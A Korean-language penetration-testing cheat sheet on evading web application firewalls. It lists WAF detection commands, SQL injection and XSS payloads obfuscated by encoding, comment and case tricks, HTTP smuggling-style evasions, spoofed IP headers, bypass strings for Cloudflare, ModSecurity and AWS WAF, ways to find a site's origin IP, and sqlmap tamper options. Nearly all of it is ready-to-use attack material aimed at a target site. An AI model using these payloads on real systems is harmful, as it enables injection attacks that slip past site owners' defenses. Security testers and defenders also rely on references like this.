# WAF Bypass — 방화벽 우회 기법

## WAF 탐지
```bash
# wafw00f
wafw00f https://target.com

# nmap
nmap -p80,443 --script http-waf-detect target.com
nmap -p80,443 --script http-waf-fingerprint target.com

# 수동 탐지 (403/406/412 응답 확인)
curl "https://target/?id=1' OR 1=1--"
curl "https://target/?id=<script>alert(1)</script>"
```

## 공통 우회 기법

### 인코딩 기반
```
# URL 인코딩
' → %27
<script> → %3cscript%3e
UNION → %55NION

# 이중 URL 인코딩
' → %2527
< → %253c

# HTML 엔티티 (XSS)
<script> → &#x3c;script&#x3e;
alert → &#97;&#108;&#101;&#114;&#116;

# Base64 (eval 등과 조합)
eval(atob('YWxlcnQoMSk='))

# UTF-8 변형
＜script＞ (전각 문자)
<ſcript> (unicode 대체 문자)
```

### 공백/주석 치환
```sql
-- SQL 공백 대체
SELECT/**/password/**/FROM/**/users
SELECT%09password%09FROM%09users   (%09=Tab)
SELECT%0apassword%0aFROM%0ausers   (%0a=LF)
SELECT%0dpassword%0dFROM%0dusers   (%0d=CR)
SELECT%a0password%a0FROM%a0users   (%a0=NBSP)

-- MySQL 인라인 주석
SELECT /*!32302 password*/ FROM users
SELECT /*!50000 password*/ FROM users
```

### 대소문자/키워드 분리
```sql
SeLeCt PaSsWoRd FrOm UsErS
UNION%0aSELECT
UN/**/ION SEL/**/ECT
CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74)  -- 'select' in hex
```

### HTTP 레벨 우회
```
# 청크 인코딩 (Chunked Transfer)
Transfer-Encoding: chunked
5\r\n
union\r\n
...

# Content-Type 변경
application/json → text/plain → application/x-www-form-urlencoded

# HTTP 버전 변경
HTTP/1.0 → HTTP/1.1 → HTTP/2

# 파라미터 오염 (HPP)
?id=1&id=1 UNION SELECT 1,2,3--

# 대형 바디로 WAF 버퍼 초과
Content-Length: 99999 + 쓸모없는 데이터 + 페이로드

# Multipart 활용
Content-Type: multipart/form-data
payload를 분리된 part에 삽입
```

### 헤더 기반
```
# IP 우회 헤더 (내부망으로 인식 유도)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1

# User-Agent 변경 (Googlebot 등)
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0)
```

## WAF별 특화 우회

### Cloudflare
```
# 실제 서버 IP 찾기 (SPF 레코드, Shodan, Certificate Transparency)
dig TXT target.com | grep "ip4:"
shodan search "ssl.cert.subject.cn:target.com"

# 직접 IP 접근
curl --resolve target.com:443:REAL_IP https://target.com/ -k
```

### ModSecurity (OWASP CRS)
```sql
-- Paranoia Level 1 우회
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' UNION%0ASELECT%0A1,2,3--

-- CRS 특정 규칙 우회
/*!50000select*/ → 구버전 MySQL 인라인 주석
```

### AWS WAF
```
# JSON 구문 활용
{"id": "1 UNION SELECT 1,2,3"}
{"id": {"$gt": 0}}  # NoSQL 스타일로 파서 혼용 유도
```

## SQLmap WAF 우회 Tamper
```bash
# 기본 tamper 조합
--tamper=space2comment
--tamper=between
--tamper=randomcase
--tamper=charencode
--tamper=chardoubleencode
--tamper=space2randomblank
--tamper=equaltolike
--tamper=greatest
--tamper=ifnull2ifisnull

# Cloudflare 우회
--tamper=between,randomcase,space2comment --random-agent --delay=2

# ModSecurity 우회
--tamper=space2comment,charencode,between --level=3 --risk=2
```

## 실제 IP 발굴
```bash
# 1. Shodan
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str

# 2. Certificate Transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# 3. DNS 히스토리
curl "https://securitytrails.com/domain/target.com/history/a"

# 4. SPF 레코드
dig TXT target.com | grep spf

# 5. Mail Exchange
dig MX target.com
# MX 서버의 IP가 실제 서버와 동일 대역인 경우

# 6. 서브도메인 직접 접근 (CDN 미적용)
subfinder -d target.com | httpx -sc -td
```
